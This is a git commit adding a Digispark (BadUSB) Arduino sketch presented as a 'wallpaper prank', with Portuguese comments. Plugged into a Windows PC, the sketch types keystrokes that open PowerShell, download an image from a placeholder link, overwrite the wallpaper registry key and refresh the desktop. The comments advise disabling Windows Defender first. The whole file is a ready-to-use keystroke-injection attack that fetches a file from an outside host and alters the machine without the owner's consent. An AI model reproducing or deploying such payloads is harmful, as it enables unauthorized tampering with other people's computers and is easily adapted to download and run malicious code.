7fc516ab927977563f3e88462c76b0456be2af6f
Marlon Gabriel <132375402+ghostmarlon@users.noreply.github.com>
2023-05-04 16:45:55 -0300

    wallpapper_prank.ino

---
+++ wallpapper_prank.ino
@@ -0,0 +1,35 @@
+///para alguns pc lixo o power shell pode demorar abrir... entao sera nescessario alterar o delay de cada item.
+///na linha 18 altere o delay de 500 para acima de 1200 (depende muito da tua batata ai) caso esteje muito lento é so diminuir o valor para o desejado////
+//abraço do titiu marlao dimaize//
+// testado no win10/7/8.1/ 11 funciona mais o windows bloqueia.. entao desative o windows defender antes. como sei q é uma otima pessoa vai usar para estudos correto? 
+
+#include "DigiKeyboard.h"
+void setup() {
+  //empty
+}
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("powershell");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("$client = new-object System.Net.WebClient");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("$client.DownloadFile(\"LINK DA FOTO PRA ALTERAR O WALLPAPPER\" , \"nomedafoto.jpg\")");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /d \"%USERPROFILE%\\nomedafoto.jpg\" /f");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  for(;;){ /*empty*/ }
+}
